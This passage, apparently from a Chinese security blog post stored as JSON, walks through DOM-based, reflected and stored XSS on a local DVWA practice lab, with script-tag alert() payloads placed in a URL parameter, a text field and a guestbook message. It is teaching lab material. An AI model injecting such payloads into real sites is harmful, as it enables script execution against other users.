class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>主逻辑是：</p>\n<p>获取当前form表单document的location对象的href（当前浏览的url值，对于下图就是<code>http://127.0.0.1/DVWA/vulnerabilities/xss_d/</code>）</p>\n<p>然后判断这个url字符串中“default=”第一次出现的位置是否&gt;=0</p>\n<p><img src=\"image-20221004215924339.png\" alt=\"image-20221004215924339\"></p>\n<p>当然，我们回到刚刚的页面上就是在获取这个url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004220400905.png\" alt=\"image-20221004220400905\"></p>\n<p>substring(start,stop)</p>\n<p>然后截取从“default=”第一次出现的位置 + 8【也就是=号右边第一个字符，把整个“default=”跨了过去】到结尾的内容的字符串，保存到lang变量。</p>\n<p>往document，也就是当前html页面的option标签的value值中写入刚刚获取到的lang值，其选项显示部分使用decoreURI对lang进行解码，由于English中未含有非英文部分，所以就是English。【这一步会往选项里再添加一个English】</p>\n<p>接着往当前html页面的option标签里的value写入空，且关闭其选择属性，加入——这个选项。【这一步会往选项里再添加一个——】</p>\n<p><img src=\"image-20221004221129050.png\" alt=\"image-20221004221129050\"></p>\n<p>那么，我们可以看到，这个lang是从当前url里获取到的，且未经过任何校验就直接写入标签中。</p>\n<p>我们可以控制这个lang变量，使其直接执行js脚本</p>\n<p><img src=\"image-20221004221907384.png\" alt=\"image-20221004221907384\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004222113645.png\" alt=\"image-20221004222113645\"></p>\n<p>其改变了当前HTML的页面DOM结构，因此，我们称其为DOM型XSS攻击。</p>\n<h2 id=\"反射型XSS-1\"><a href=\"#反射型XSS-1\" class=\"headerlink\" title=\"反射型XSS\"></a>反射型XSS</h2><p>我们输入11111，结果看到页面回显了”Hello 11111”</p>\n<p><img src=\"image-20221004222654007.png\" alt=\"image-20221004222654007\"></p>\n<p>看一下前台代码，是使用GET请求去将获取text的内容发送给服务器，而text我们可控</p>\n<p><img src=\"image-20221004222954963.png\" alt=\"image-20221004222954963\"></p>\n<p>输入11111，会回显到前台。</p>\n<p><img src=\"image-20221004223147315.png\" alt=\"image-20221004223147315\"></p>\n<p>那么，我们发现11111可能未经过处理，直接放入pre标签显示。</p>\n<p>因此可以在pre标签里插入script标签，完成弹窗操作。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(666)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004223056096.png\" alt=\"image-20221004223056096\"></p>\n<p>因为这个页面将一些交互内容回显到了前台上，使得我们成功利用Js脚本完成攻击，我们称其为反射型XSS攻击。</p>\n<h2 id=\"存储型XSS-1\"><a href=\"#存储型XSS-1\" class=\"headerlink\" title=\"存储型XSS\"></a>存储型XSS</h2><p><img src=\"image-20221004223720910.png\" alt=\"image-20221004223720910\"></p>\n<p>我们通过留言功能，可以看到我们的输入会被记录在页面上。</p>\n<p><img src=\"image-20221004223847678.png\" alt=\"image-20221004223847678\"></p>\n<p>我们按照刚刚的思路，直接尝试看看能否弹窗。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name：jack</span><br><span class=\"line\">Message：&lt;script&gt;alert(1234)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>刷新回来后会一直弹窗</p>\n<p><img src=\"image-20221004224120560.png\" alt=\"image-20221004224120560\"></p>\n<p>我们看下源码信息</p>\n<p><img src=\"image-20221004224444379.png\" alt=\"image-20221004224444379\"></p>\n<p>我们看到Name的maxlength为10，Message的length为50，所以使用Message来做XSS攻击更合适一些</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert()&lt;/script&gt;</span><br><span class=\"line\">最简短的js脚本也有24个字符</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004224705526.png\" alt=\"image-20221004224705526\"></p>\n<p>如果两个长度都不限，则都适合用来XSS攻击。</p>\n",
            "tags": [
                "XSS跨站脚本攻击探究"
            ]
        }
    ]
}